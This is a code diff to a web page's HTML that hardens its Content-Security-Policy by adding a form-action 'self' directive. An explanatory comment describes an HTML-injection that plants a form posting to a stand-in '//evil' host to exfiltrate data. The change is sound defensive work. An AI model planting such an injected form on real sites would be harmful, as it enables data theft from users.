@@ -27,8 +27,14 @@
       fetched bytes only flow into the WASM validator and are never re-sent. The
       postMessage allowedOrigins allowlist (src/App.jsx) still gates hostile
       INBOUND bytes — keep it strict. script-src is deliberately NOT widened.
+
+      form-action 'self': there are no real <form> submits, but form-action does
+      NOT fall back to default-src, so without it an HTML-injection could plant a
+      <form action="//evil"> and POST data off-origin. Pinning it to 'self' closes
+      that exfil path (defence-in-depth alongside the no-innerHTML invariant — see
+      hooks/pre-commit, which rejects any innerHTML sink in frontend/src).
     -->
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'wasm-unsafe-eval' blob: https://www.googletagmanager.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://www.google-analytics.com; connect-src 'self' blob: https:; worker-src 'self' blob:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'" />
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'wasm-unsafe-eval' blob: https://www.googletagmanager.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://www.google-analytics.com; connect-src 'self' blob: https:; worker-src 'self' blob:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'" />
 
     <!-- Primary SEO -->
     <title>ICC Profile Tool — Inspect, Validate &amp; Edit ICC Profiles Online</title>
